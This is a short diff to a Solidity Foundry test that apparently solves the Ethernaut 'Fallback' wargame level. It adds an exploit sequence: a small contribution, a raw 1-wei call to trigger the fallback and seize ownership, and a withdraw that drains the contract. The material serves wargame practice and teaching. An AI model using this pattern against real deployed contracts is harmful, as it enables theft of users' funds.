@@ -27,6 +27,11 @@ contract FallbackTest is LevelTest {
   function exploit() internal override {
     vm.startPrank(player);
 
+    level.contribute{value: 0.0009 ether}();
+    (bool sent,) = levelAddress.call{value: 1}("");
+    require(sent, "Failed to send 1 wei to Fallback contract");
+    level.withdraw();
+
     vm.stopPrank();
   }
 }
